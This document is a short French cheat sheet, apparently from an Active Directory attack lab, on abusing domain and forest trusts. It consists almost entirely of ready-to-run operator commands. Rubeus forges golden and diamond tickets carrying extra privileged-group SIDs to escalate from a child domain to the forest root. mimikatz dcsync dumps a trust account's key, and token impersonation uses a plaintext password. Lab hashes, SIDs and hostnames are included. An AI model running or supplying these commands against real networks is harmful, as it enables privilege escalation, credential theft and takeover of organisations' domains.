# Relations de confiance entre domaines et forêts

* Tickets inter-realm
* Relations de confiance parent-enfant
* Relations de confiance entrantes
* Relations de confiance sortantes

### Énumérer les Trusted Domain Objects

```
ldapsearch (objectClass=trustedDomain)
```

### Énumérer les comptes de trust

```
ldapsearch (samAccountType=805306370) --attributes samAccountName
```

### Identifier les relations de confiance parent-enfant

```
ldapsearch (objectClass=trustedDomain)
```

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```  

### Récupérer le SID du domaine parent

```
ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```  

Le SID du domaine parent peut être ajouté au ticket.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
```  

Une fois le ticket injecté dans la session de connexion, il peut servir à accéder au contrôleur de domaine racine de la forêt.

beacon> ls \\lon-dc-1\c$

### Relations de confiance sortantes

```
getuid
ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
make_token CONTOSO\Administrator Passw0rd!
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

run klist
```


